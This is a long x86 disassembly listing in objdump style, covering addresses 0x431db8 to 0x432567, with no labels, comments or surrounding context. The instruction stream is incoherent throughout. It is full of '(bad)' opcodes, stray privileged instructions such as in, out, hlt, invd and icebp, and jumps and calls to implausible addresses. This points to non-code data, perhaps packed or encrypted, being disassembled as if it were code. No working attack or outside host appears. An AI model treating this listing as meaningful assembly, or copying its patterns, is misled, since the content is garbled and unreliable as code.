  431db8:	fadd   DWORD PTR [ebp+0x0]
  431dbb:	xor    ecx,DWORD PTR [edi]
  431dbd:	add    ecx,ecx
  431dbf:	cmp    edi,edi
  431dc1:	pmuludq mm7,QWORD PTR [edx+0x50]
  431dc5:	(bad)  
  431dc6:	jmp    0x431d53
  431dc8:	mov    edi,esp
  431dca:	or     al,0xc6
  431dcc:	inc    ebp
  431dcd:	(bad)  
  431dce:	mov    eax,DWORD PTR [ebp+0x10]
  431dd1:	jne    0x431d5c
  431dd3:	mov    eax,DWORD PTR [ecx]
  431dd5:	clc    
  431dd6:	add    BYTE PTR [ebp-0x40],cl
  431dd9:	xor    edx,DWORD PTR [eax-0x73]
  431ddc:	jne    0x431ddf
  431dde:	push   DWORD PTR [edx+0x8]
  431de1:	add    BYTE PTR [ebp+0x45],al
  431de4:	mov    ebp,ecx
  431de6:	cld    
  431de7:	add    BYTE PTR [ebp+0x0],cl
  431dea:	xor    eax,DWORD PTR [ebp+0x3]
  431ded:	mov    DWORD PTR [ebx],edi
  431def:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431df5:	sub    eax,0x5d330e4d
  431dfa:	lea    esi,[ebx]
  431dfc:	add    DWORD PTR [ebx],eax
  431dfe:	jb     0x431de9
  431e00:	add    BYTE PTR [eax],al
  431e02:	inc    ebp
  431e03:	add    bl,ch
  431e05:	inc    ebp
  431e06:	mov    esi,DWORD PTR [ebx]
  431e08:	or     al,0x3
  431e0a:	(bad)  
  431e0b:	mov    edi,eax
  431e0d:	in     al,dx
  431e0e:	scas   eax,DWORD PTR es:[edi]
  431e0f:	inc    ebp
  431e10:	mov    esi,DWORD PTR [ebx]
  431e12:	in     al,0x3
  431e14:	add    al,0x89
  431e16:	mov    ecx,DWORD PTR [eax+edi*8]
  431e19:	dec    ebp
  431e1a:	(bad)  
  431e1b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431e22:	mov    ecx,eax
  431e24:	cld    
  431e25:	push   es
  431e26:	dec    ebp
  431e27:	add    al,0x33
  431e29:	mov    DWORD PTR [ebx],eax
  431e2b:	in     al,dx
  431e2c:	cmp    DWORD PTR [ebp-0x67],eax
  431e2f:	mov    eax,DWORD PTR [ebp-0xba0068]
  431e35:	mov    edx,DWORD PTR [ebp-0x4]
  431e38:	mov    ecx,DWORD PTR [ebp-0x2c]
  431e3b:	xor    eax,DWORD PTR [ebp+0x3]
  431e3e:	cmp    DWORD PTR [ebx],0x8b32749a
  431e44:	xor    edi,esp
  431e46:	jmp    0xff771b98
  431e4b:	add    ecx,DWORD PTR [ebp-0x3f]
  431e4e:	xor    ebx,DWORD PTR [edi]
  431e50:	add    eax,ecx
  431e52:	cmp    ebx,DWORD PTR [eax]
  431e54:	mov    ecx,DWORD PTR [ebp-0x4]
  431e57:	mov    ecx,DWORD PTR [eax]
  431e59:	adc    BYTE PTR [ebp-0x80],al
  431e5c:	jmp    0x431e5f
  431e5e:	mov    eax,DWORD PTR [eax]
  431e60:	cld    
  431e61:	mov    bh,0xc6
  431e63:	push   ecx
  431e64:	(bad)  
  431e65:	jne    0x431ec5
  431e67:	dec    ecx
  431e69:	or     BYTE PTR [ecx+ebx*1],cl
  431e6c:	push   ebp
  431e6d:	inc    ebp
  431e6e:	in     al,dx
  431e6f:	add    ebp,esp
  431e71:	or     bh,al
  431e73:	dec    ebp
  431e74:	cld    
  431e75:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e7b:	xor    DWORD PTR [edx],0x2
  431e7e:	pushf  
  431e7f:	dec    DWORD PTR [ebx+0x45510cf4]
  431e85:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e8b:	mov    edx,DWORD PTR [ecx+0xc]
  431e8e:	xor    eax,esi
  431e90:	mov    edx,0xc172c7
  431e95:	inc    ebp
  431e96:	mov    esi,DWORD PTR [ebp+0x8]
  431e99:	mov    eax,edx
  431e9b:	call   0x84c7e590
  431ea0:	add    DWORD PTR [ebx-0x76bace00],ebx
  431ea6:	mov    ebp,eax
  431ea8:	or     BYTE PTR [eax],dl
  431eaa:	jo     0x431ef9
  431eac:	push   edi
  431ead:	xor    esi,DWORD PTR [ebp+0x3]
  431eb0:	(bad)  
  431eb1:	pmulhuw mm0,mm1
  431eb4:	test   DWORD PTR [ebp-0x8],ecx
  431eb7:	mov    DWORD PTR [ebp-0x67],eax
  431eba:	mov    eax,DWORD PTR [ebp-0x4]
  431ebd:	xor    edi,DWORD PTR [ebp-0x73]
  431ec0:	xor    eax,DWORD PTR [ebx]
  431ec2:	xor    esi,DWORD PTR [edx+0x3]
  431ec5:	add    BYTE PTR [ecx],bh
  431ec7:	inc    ebp
  431ec8:	(bad)  
  431ec9:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431ecf:	mov    DWORD PTR [eax],0x750f0004
  431ed5:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431edb:	lock add BYTE PTR [ebp+0x0],cl
  431edf:	mov    esi,DWORD PTR [ebp-0x18]
  431ee2:	mov    ebp,edx
  431ee4:	or     al,0x72
  431ee6:	ja     0x431ee8
  431ee8:	mov    edx,esi
  431eea:	cld    
  431eeb:	(bad)  
  431eee:	cli    
  431eef:	mov    esi,DWORD PTR [ebp-0x4]
  431ef2:	cmp    ecx,esi
  431ef4:	bswap  edi
  431ef6:	(bad)
  431efa:	mov    esi,DWORD PTR [ebp-0x4]
  431efd:	mov    esi,ecx
  431eff:	clc    
  431f00:	repnz add esi,DWORD PTR [ebp+0x45]
  431f04:	push   ebx
  431f05:	xor    eax,DWORD PTR [ebp+0x3]
  431f08:	cmp    al,0x5f
  431f0a:	pushf  
  431f0b:	pop    ebx
  431f0c:	jmp    0x431fd3
  431f11:	mov    esi,DWORD PTR [ebp-0x7d]
  431f14:	xor    ebp,DWORD PTR [eax]
  431f16:	lea    eax,[ebp-0x8]
  431f19:	xor    edx,esi
  431f1b:	pushf  
  431f1c:	out    dx,eax
  431f1d:	(bad)  
  431f1e:	neg    eax
  431f20:	ins    DWORD PTR es:[edi],dx
  431f21:	test   esi,edi
  431f23:	clc    
  431f24:	pop    esp
  431f25:	inc    ebp
  431f26:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431f2c:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431f32:	add    cl,al
  431f34:	jne    0x431ed1
  431f36:	mov    esi,DWORD PTR [edx]
  431f38:	in     al,dx
  431f39:	push   esi
  431f3a:	xor    BYTE PTR [ebp-0xe],dh
  431f3d:	add    edi,esi
  431f3f:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431f45:	add    cl,bh
  431f47:	mov    edi,DWORD PTR [ebp+0x8]
  431f4a:	mov    DWORD PTR [ebp-0x14],esi
  431f4d:	add    esi,DWORD PTR [ebp+0x3c]
  431f50:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431f56:	mov    ah,0x3e
  431f58:	fwait
  431f59:	pushf  
  431f5a:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431f60:	jne    0x431eed
  431f62:	mov    ecx,DWORD PTR [esp+ebp*8]
  431f65:	icebp  
  431f66:	icebp  
  431f67:	shl    edx,0xf2
  431f6a:	(bad)  
  431f6b:	mov    ah,0x16
  431f6d:	push   eax
  431f6e:	jne    0x431f03
  431f70:	mov    ecx,DWORD PTR [edi]
  431f72:	in     al,dx
  431f73:	jmp    0x431f66
  431f75:	add    dl,dh
  431f77:	mov    edi,esi
  431f79:	or     al,0x8
  431f7b:	inc    ebp
  431f7c:	jne    0x431f81
  431f7e:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f84:	ret    
  431f85:	or     bh,bh
  431f87:	jge    0x431f71
  431f89:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f8f:	xor    edi,eax
  431f91:	add    esi,DWORD PTR [ebp-0x77]
  431f94:	mov    ebx,esp
  431f96:	clc    
  431f97:	neg    DWORD PTR [ebp-0x7c]
  431f9a:	xor    eax,DWORD PTR [eax]
  431f9c:	cmp    eax,DWORD PTR [eax]
  431f9e:	repz jne 0x431f36
  431fa1:	xor    eax,DWORD PTR [ecx]
  431fa3:	add    ebx,DWORD PTR [eax]
  431fa5:	mov    DWORD PTR [ebp-0x8],eax
  431fa8:	mov    eax,edi
  431faa:	cld    
  431fab:	lock pop eax
  431fad:	test   DWORD PTR [ebx],esi
  431faf:	clc    
  431fb0:	add    edx,DWORD PTR [edi-0x740bff77]
  431fb6:	fdivp  st(4),st
  431fb8:	test   ecx,esi
  431fba:	(bad)  
  431fbb:	jnp    0x431fbc
  431fbd:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431fc3:	jae    0x431f50
  431fc5:	sub    edi,esp
  431fc7:	(bad)  
  431fc8:	shl    DWORD PTR [eax-0x3e],0x89
  431fcc:	leave  
  431fcd:	call   0x8198d6da
  431fd2:	in     al,dx
  431fd3:	(bad)  
  431fd4:	in     al,dx
  431fd5:	add    bh,al
  431fd7:	mov    esp,edi
  431fd9:	in     al,dx
  431fda:	test   DWORD PTR [ebp-0x8],edi
  431fdd:	mov    eax,DWORD PTR [ebp+0x2b]
  431fe0:	xor    al,BYTE PTR [ebx]
  431fe2:	pushf  
  431fe3:	jnp    0x57321c1c
  431fe9:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431fed:	loopne 0x432022
  431fef:	jne    0x431fac
  431ff1:	mov    esi,DWORD PTR [edx-0x20]
  431ff4:	add    BYTE PTR [ebp-0x3d],bh
  431ff7:	xor    eax,DWORD PTR [ebp-0x73]
  431ffa:	mov    edi,DWORD PTR [esi]
  431ffc:	cld    
  431ffd:	jb     0x431fc5
  431fff:	add    bl,al
  432001:	jne    0x432048
  432003:	mov    edx,DWORD PTR [edi-0x10]
  432006:	jge    0x432085
  432008:	mov    esi,DWORD PTR [ebx]
  43200a:	lock add ecx,DWORD PTR [ebp+0x3b]
  43200e:	xor    esi,DWORD PTR [ebp-0x77]
  432011:	mov    esi,eax
  432013:	lock inc ebp
  432015:	jge    0x432048
  432017:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  43201e:	dec    ebp
  43201f:	mov    esi,DWORD PTR [ebx]
  432021:	loopne 0x431fac
  432023:	jge    0x43201d
  432025:	add    DWORD PTR [ebp-0x7d],eax
  432028:	icebp  
  432029:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  432030:	dec    ebp
  432031:	hlt    
  432032:	xor    ebx,DWORD PTR [ebp-0x77]
  432035:	mov    esi,esp
  432037:	in     al,0x45
  432039:	jge    0x432078
  43203b:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432042:	dec    ebp
  432043:	push   esp
  432044:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  43204a:	inc    ebp
  43204b:	hlt    
  43204c:	xor    DWORD PTR [ebp-0x61],esi
  43204f:	mov    edi,DWORD PTR [eax+0xf19504]
  432055:	repnz mov DWORD PTR [ebp+0x20],ebx
  432059:	cmp    eax,DWORD PTR [ebp+0xf]
  43205c:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432060:	fistp  WORD PTR [ebx+0x0]
  432063:	inc    ebp
  432064:	mov    ebx,DWORD PTR [edi+0xc]
  432067:	add    eax,eax
  432069:	inc    ebp
  43206a:	test   BYTE PTR [ebx],dh
  43206c:	add    eax,DWORD PTR [ebx]
  43206e:	add    BYTE PTR [esi+0x45],bl
  432071:	ret    0x85
  432074:	jnp    0x5443a443
  43207a:	inc    bp
  43207c:	inc    ebp
  43207d:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432083:	fdiv   QWORD PTR [ebx]
  432085:	test   DWORD PTR [ecx+0x453bf8],edi
  43208b:	push   ebx
  43208c:	add    edi,DWORD PTR [esi+0x708088b]
  432092:	cmp    esi,eax
  432094:	setnp  BYTE PTR [ecx-0x74fcffce]
  43209b:	mov    esp,edi
  43209d:	call   0x33ce65ef
  4320a2:	or     BYTE PTR [ebx],al
  4320a4:	inc    ecx
  4320a5:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4320ab:	and    BYTE PTR [ebp-0x7074f0bb],al
  4320b1:	lock add cl,al
  4320b4:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4320bb:	mov    ch,0x45
  4320bd:	clc    
  4320be:	xor    eax,DWORD PTR [ebp+0x3]
  4320c1:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4320c7:	inc    ebp
  4320c8:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4320ce:	mov    edi,eax
  4320d0:	mov    eax,DWORD PTR [ebp+0x3c]
  4320d3:	mov    ecx,DWORD PTR [eax]
  4320d5:	hlt    
  4320d6:	inc    ebp
  4320d7:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4320de:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4320e4:	push   ebp
  4320e5:	mov    edi,DWORD PTR [ebx]
  4320e7:	in     al,dx
  4320e8:	jne    0x4320ab
  4320ea:	mov    eax,DWORD PTR [ebp-0x28]
  4320ed:	add    DWORD PTR [eax],0xe8058dec
  4320f3:	clc    
  4320f4:	mov    esi,DWORD PTR [edi-0x8]
  4320f7:	add    dh,dl
  4320f9:	rol    WORD PTR [ebp-0x1],cl
  4320fd:	mov    edx,DWORD PTR [eax+0x8]
  432100:	jne    0x4320c2
  432102:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432109:	inc    ebp
  43210a:	push   esp
  43210b:	test   DWORD PTR [ecx+0xf],ecx
  43210e:	sub    edx,esp
  432110:	add    eax,DWORD PTR [eax]
  432112:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432118:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43211f:	mov    eax,DWORD PTR [ecx]
  432121:	and    BYTE PTR [eax],al
  432123:	cmp    al,0x10
  432125:	add    BYTE PTR [ebp+0x66],al
  432128:	inc    ecx
  43212a:	push   esp
  43212b:	add    dh,BYTE PTR [ebp+0x0]
  43212e:	push   edx
  43212f:	enterw 0xc1,0x4d
  432134:	mov    esp,DWORD PTR [esi+0x20]
  432137:	add    DWORD PTR [ecx-0x7b],eax
  43213a:	add    eax,DWORD PTR [ebx]
  43213c:	str    WORD PTR [eax+0x45]
  432140:	lea    ecx,[ebx+0x45890801]
  432146:	sbb    BYTE PTR [ebx],al
  432148:	dec    ebp
  432149:	cmp    al,0xf
  43214b:	inc    ebp
  43214c:	push   eax
  43214d:	mov    esi,DWORD PTR [ebx]
  43214f:	push   eax
  432150:	add    eax,eax
  432152:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432159:	inc    ebp
  43215a:	add    BYTE PTR [ecx],dh
  43215c:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432163:	(bad)  
  432164:	mov    ebx,eax
  432166:	loopne 0x4321ad
  432168:	dec    ebp
  432169:	mov    ecx,DWORD PTR [edi]
  43216b:	cld    
  43216c:	push   eax
  43216d:	xchg   DWORD PTR [ebx],esi
  43216f:	add    DWORD PTR [ebx],ebp
  432171:	add    BYTE PTR [ebx],ch
  432173:	or     BYTE PTR [ecx],bh
  432175:	dec    ecx
  432176:	loopne 0x43217b
  432178:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  43217e:	push   ebp
  43217f:	add    DWORD PTR [ebx+0x55100800],eax
  432185:	dec    ebp
  432186:	jmp    0x432111
  432188:	mov    esp,DWORD PTR [eax]
  43218a:	sbb    dl,dl
  43218c:	inc    eax
  43218d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432193:	add    BYTE PTR [ebx+0x74528555],cl
  432199:	push   ebp
  43219a:	div    DWORD PTR [ebx]
  43219c:	and    eax,DWORD PTR [ebx]
  43219e:	add    edx,DWORD PTR [edx-0x30]
  4321a1:	jno    0x43212e
  4321a3:	inc    DWORD PTR [eax+eiz*1]
  4321a6:	inc    ebp
  4321a7:	push   eax
  4321a8:	push   eax
  4321a9:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4321af:	mov    edi,esp
  4321b1:	push   eax
  4321b2:	inc    ebp
  4321b3:	enter  0x458b,0x8
  4321b7:	push   ecx
  4321b8:	(bad)  
  4321b9:	call   0x10d2b91
  4321be:	pop    ss
  4321bf:	push   ebp
  4321c0:	mov    ecx,DWORD PTR [ebx+0x489408]
  4321c6:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4321cc:	push   ecx
  4321cd:	jo     0x4321b7
  4321cf:	inc    DWORD PTR [edi]
  4321d1:	or     BYTE PTR [eax],al
  4321d3:	call   0xce291d
  4321d8:	fmul   QWORD PTR [ebp+0x55]
  4321db:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4321e1:	mov    bh,0x8c
  4321e3:	adc    al,0x9b
  4321e5:	dec    esp
  4321e6:	xor    bl,BYTE PTR [eax]
  4321e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4321eb:	mov    eax,DWORD PTR [ebp-0x4]
  4321ee:	mov    esi,DWORD PTR [edi-0x3148f924]
  4321f4:	push   es
  4321f5:	retf   
  4321f6:	mov    BYTE PTR [ebp-0x30],0x3b
  4321fa:	inc    ebp
  4321fb:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432202:	retf   0x83fc
  432205:	into   
  432206:	dec    ebp
  432207:	retf   
  432208:	mov    ecx,DWORD PTR [ebp-0x74]
  43220b:	mov    eax,DWORD PTR [eax]
  43220d:	fdiv   QWORD PTR [ebx]
  43220f:	mov    bh,0x3
  432211:	push   es
  432212:	mov    esi,ecx
  432214:	sbb    cl,dl
  432216:	dec    ebp
  432217:	sar    DWORD PTR [ebx],cl
  432219:	push   ebp
  43221a:	jne    0x43222b
  43221c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432222:	lea    ebx,[eax]
  432224:	call   0xf4ccadeb
  432229:	sbb    dh,dl
  43222b:	add    edx,ebx
  43222d:	push   ebp
  43222e:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432234:	push   ecx
  432235:	mov    DWORD PTR [eax-0x30],edx
  432238:	test   DWORD PTR [edx],eax
  43223a:	xadd   esp,esi
  43223d:	pop    es
  43223e:	add    cl,dl
  432240:	mov    eax,ecx
  432242:	or     al,0x45
  432244:	(bad)  
  432245:	push   eax
  432246:	add    DWORD PTR [edx+0x0],eax
  432249:	add    ecx,DWORD PTR [ecx]
  43224b:	and    dh,cl
  43224d:	call   0xc72b1d
  432252:	add    DWORD PTR [ebp+0x0],edx
  432255:	mov    esp,DWORD PTR [ebp+0x18]
  432258:	add    BYTE PTR [eax+0x50],cl
  43225b:	xor    eax,DWORD PTR [eax]
  43225d:	add    esp,DWORD PTR [esi+0x3b]
  432260:	inc    ebp
  432261:	je     0x4321e6
  432263:	push   ecx
  432264:	dec    BYTE PTR [ebp-0x77]
  432267:	add    eax,esi
  432269:	or     al,0x5e
  43226b:	inc    eax
  43226c:	add    BYTE PTR [ebx],al
  43226e:	data16 and BYTE PTR [ebp+0x50],al
  432272:	sub    DWORD PTR [ecx],0xfffffff8
  432275:	add    BYTE PTR [ebp-0x75],ah
  432278:	add    BYTE PTR [eax],bl
  43227a:	enter  0x894d,0x8b
  43227e:	int3   
  43227f:	loopne 0x432243
  432281:	rol    BYTE PTR [eax],0x33
  432284:	lea    cx,[ebp+0xa]
  432288:	data16 jb 0x4322d0
  43228b:	add    BYTE PTR [ebx+0x44890855],cl
  432291:	sbb    ah,al
  432293:	inc    ebp
  432294:	cmp    al,0xf
  432296:	add    BYTE PTR [edx+0x66],dl
  432299:	xor    ecx,DWORD PTR [eax]
  43229b:	sub    eax,DWORD PTR [edx]
  43229d:	mov    eax,DWORD PTR [eax]
  43229f:	or     al,0x66
  4322a1:	ror    edx,cl
  4322a3:	dec    ebp
  4322a4:	inc    ebp
  4322a5:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4322ab:	cld    
  4322ac:	or     BYTE PTR [edi+0x4501dd],dl
  4322b2:	ret    0xecce
  4322b5:	retf   
  4322b6:	(bad)  
  4322b7:	dec    ebp
  4322b8:	mov    al,0x8b
  4322ba:	loopne 0x4322dc
  4322bc:	cmp    ecx,DWORD PTR [edx]
  4322be:	inc    ebp
  4322bf:	daa    
  4322c0:	loopne 0x432249
  4322c2:	in     al,dx
  4322c3:	add    edi,eax
  4322c5:	add    BYTE PTR [eax+0x3f52e155],bh
  4322cb:	push   ebp
  4322cc:	inc    ebp
  4322cd:	xor    ebx,edx
  4322cf:	add    ebp,esp
  4322d1:	push   edx
  4322d2:	push   bp
  4322d4:	inc    ebp
  4322d5:	(bad)  
  4322d6:	in     eax,dx
  4322d7:	push   esp
  4322d8:	(bad)  
  4322d9:	inc    edx
  4322db:	sbb    al,0x33
  4322dd:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4322e4:	add    BYTE PTR [ebp+0x46],0x8b
  4322e8:	jmp    0xf98b:0x100041c8
  4322ef:	xor    esi,DWORD PTR [edx+0x3]
  4322f2:	mov    ecx,DWORD PTR [edi]
  4322f4:	fmul   DWORD PTR [edx]
  4322f6:	add    BYTE PTR [eax],al
  4322f8:	lea    eax,[ebx-0x4700273c]
  4322fe:	add    al,0x4f
  432300:	pop    DWORD PTR [eax]
  432302:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  432308:	push   edx
  432309:	inc    WORD PTR [ebp+0x8]
  43230d:	mov    eax,0x514f4d
  432312:	(bad)
  432316:	add    al,al
  432318:	xor    DWORD PTR [ebx-0x74baf730],eax
  43231e:	test   DWORD PTR [esi+0x74],esp
  432321:	inc    ebp
  432322:	mov    DWORD PTR [eax+0xa4e08],edi
  432328:	add    BYTE PTR [ecx-0x76c435bb],cl
  43232e:	or     dh,cl
  432330:	or     eax,0x8b8d5045
  432335:	inc    ebp
  432336:	mov    WORD PTR [ecx+0x3b8a00],?
  43233c:	jne    0x432371
  43233e:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432344:	add    DWORD PTR [ebx],eax
  432346:	add    bh,bh
  432348:	adc    DWORD PTR [eax],ecx
  43234a:	adc    DWORD PTR [ebp+0x55],edi
  43234d:	push   es
  43234e:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432354:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  43235b:	inc    ebp
  43235c:	mov    esp,edi
  43235e:	or     al,0xda
  432360:	push   eax
  432361:	(bad)  
  432362:	jne    0x432318
  432364:	call   0x3b1c53
  432369:	inc    ebp
  43236a:	sar    BYTE PTR [eax],0x84
  43236d:	in     al,dx
  43236e:	add    bh,al
  432370:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  432377:	(bad)  
  432378:	and    al,al
  43237a:	fs in  eax,dx
  43237c:	inc    DWORD PTR [ebp-0x7b]
  43237f:	jle    0x432390
  432381:	leave  
  432382:	scas   al,BYTE PTR es:[edi]
  432383:	inc    esp
  432384:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43238b:	or     BYTE PTR [ebx-0x97717c8],0x83
  432392:	call   DWORD PTR [edi]
  432394:	shr    ah,0x84
  432397:	xchg   DWORD PTR [eax],eax
  432399:	add    DWORD PTR [eax],eax
  43239b:	add    bh,bh
  43239d:	dec    ebp
  43239e:	and    BYTE PTR [ecx-0x38],dl
  4323a1:	push   eax
  4323a2:	dec    DWORD PTR [ebx+0xfd885]
  4323a8:	mov    BYTE PTR [ebp+0x508bac00],cl
  4323ae:	mov    WORD PTR [ecx+0x0],ss
  4323b1:	lea    ecx,[ebx+0x108b20d8]
  4323b7:	mov    WORD PTR [edx],ds
  4323b9:	add    BYTE PTR [edi+0xff01ff],al
  4323bf:	mov    ecx,DWORD PTR [ebp-0x28]
  4323c2:	push   ecx
  4323c3:	shl    BYTE PTR [ebp+0x3a],0x8b
  4323c7:	inc    ebp
  4323c8:	in     al,0xeb
  4323ca:	jno    0x432357
  4323cc:	push   edx
  4323cd:	mov    DWORD PTR [eax-0x28],edx
  4323d0:	mov    eax,DWORD PTR [ebp+0x20]
  4323d3:	je     0x43235c
  4323d5:	mov    eax,DWORD PTR [ecx]
  4323d7:	sbb    BYTE PTR [eax],al
  4323d9:	pop    DWORD PTR [eax]
  4323db:	add    esi,eax
  4323dd:	add    bl,al
  4323df:	adc    DWORD PTR [edi],esi
  4323e1:	jmp    0x8bce7433
  4323e6:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4323ed:	jne    0x43237a
  4323ef:	mov    ecx,DWORD PTR [eax]
  4323f1:	in     al,0x75
  4323f3:	pop    DWORD PTR [ecx+0x5401]
  4323f9:	push   edx
  4323fa:	inc    DWORD PTR [ebx]
  4323fc:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432402:	add    BYTE PTR [edi+0x9],dl
  432405:	call   DWORD PTR [esi]
  432407:	and    dl,al
  432409:	and    bh,bh
  43240b:	inc    edi
  43240d:	test   eax,edx
  43240f:	sldt   ebx
  432412:	xor    al,BYTE PTR [eax]
  432414:	pushf  
  432415:	(bad)  
  432416:	jmp    0x432424
  432418:	mov    eax,edi
  43241a:	or     al,0x75
  43241c:	inc    eax
  43241d:	call   0x431b25
  432422:	mov    eax,eax
  432424:	loopne 0x4323aa
  432426:	inc    ebp
  432427:	add    BYTE PTR [ebx+0x1451c00],cl
  43242d:	mov    eax,DWORD PTR [ebp+0x20]
  432430:	add    edi,ecx
  432432:	add    BYTE PTR [eax],ch
  432434:	cmp    edi,0x18
  432437:	test   DWORD PTR [ebp+0xf],esi
  43243a:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432441:	jne    0x432445
  432443:	call   0xffa21f08
  432448:	leave  
  432449:	rcr    BYTE PTR [esp+eax*4],0x55
  43244d:	add    ah,ch
  43244f:	add    BYTE PTR [edi-0x48fef979],dh
  432455:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  43245c:	inc    esp
  43245d:	mov    ebx,DWORD PTR [eax]
  43245f:	fcom   st(2)
  432461:	add    BYTE PTR [edi],bl
  432463:	lea    ecx,[eax-0x18]
  432466:	(bad)  
  432467:	push   DWORD PTR [ecx]
  432469:	call   0xffb571cb
  43246e:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432472:	fstp   DWORD PTR [esi+ebx*8]
  432475:	push   ebp
  432476:	pop    ebp
  432477:	mov    esi,DWORD PTR [edx-0x38]
  43247a:	add    DWORD PTR [eax],0x28
  43247d:	mov    edi,DWORD PTR [ebx]
  43247f:	xor    esi,DWORD PTR [edx+0x3]
  432482:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  432486:	pop    ebp
  432487:	or     al,0x4
  432489:	inc    ecx
  43248a:	push   ebp
  43248b:	(bad)  
  43248c:	in     al,dx
  43248d:	or     ah,ch
  43248f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432490:	xbegin 0xffc89a86
  432496:	clc    
  432497:	adc    al,0x45
  432499:	div    BYTE PTR [edx]
  43249b:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4324a2:	test   DWORD PTR [ebx+0x666300f8],ebx
  4324a8:	add    BYTE PTR [ecx+0x66],dh
  4324ab:	add    eax,DWORD PTR [ebp+0x52]
  4324ae:	adc    eax,0xffffffa0
  4324b1:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  4324b7:	test   DWORD PTR [eax],eax
  4324b9:	clc    
  4324ba:	data16 or al,BYTE PTR [ebp+0x45]
  4324be:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4324c5:	rol    BYTE PTR [ebp+0x45],1
  4324c8:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4324ce:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4324d4:	push   ebx
  4324d5:	add    BYTE PTR [eax+eax*1+0x51],dl
  4324d9:	jge    0x43250e
  4324db:	add    BYTE PTR [esi+0x4],dl
  4324de:	jne    0x432545
  4324e0:	mov    edx,0x457200
  4324e5:	jmp    0x4324a9
  4324e7:	xor    edi,DWORD PTR [ebx]
  4324e9:	pop    edi
  4324ea:	cvtdq2ps xmm7,xmm0
  4324ed:	ret    0x0
  4324f0:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4324f6:	xor    ecx,DWORD PTR [edi]
  4324f8:	add    eax,DWORD PTR [ecx+0x3b]
  4324fb:	push   ebx
  4324fc:	rdpmc  
  4324fe:	out    0x8d,al
  432500:	add    BYTE PTR [eax],cl
  432502:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432508:	ret    0x450c
  43250b:	sbb    al,0x8b
  43250d:	cmp    eax,esi
  43250f:	or     cl,al
  432511:	or     al,0xc2
  432513:	pop    eax
  432514:	inc    ebp
  432515:	add    ecx,DWORD PTR [edi]
  432517:	add    esi,DWORD PTR [ebp+0x39]
  43251a:	invd   
  43251c:	jge    0x432528
  43251e:	mov    eax,0x478ac0
  432523:	cli    
  432524:	xor    esp,ecx
  432526:	mov    ebx,0x5b8ac0
  43252b:	ret    0x33
  43252e:	mov    eax,0x833b8b
  432533:	sub    BYTE PTR [ebx],al
  432535:	inc    ebp
  432536:	xor    ax,di
  432539:	pushf  
  43253a:	inc    bh
  43253c:	mov    esp,esp
  43253e:	hlt    
  43253f:	test   DWORD PTR [ebp-0x8],esi
  432542:	mov    eax,DWORD PTR [ebp-0x14]
  432545:	xor    ecx,DWORD PTR [ebx-0x76478864]
  43254b:	dec    edi
  43254c:	or     BYTE PTR [eax],al
  43254e:	jne    0x4324d9
  432550:	mov    esi,esp
  432552:	call   0x77a9b117
  432557:	inc    ebp
  432558:	mov    DWORD PTR [eax+0x9b4f0c],edi
  43255e:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432564:	add    BYTE PTR [esi+0x7d],ah
  432567:	inc    ebp
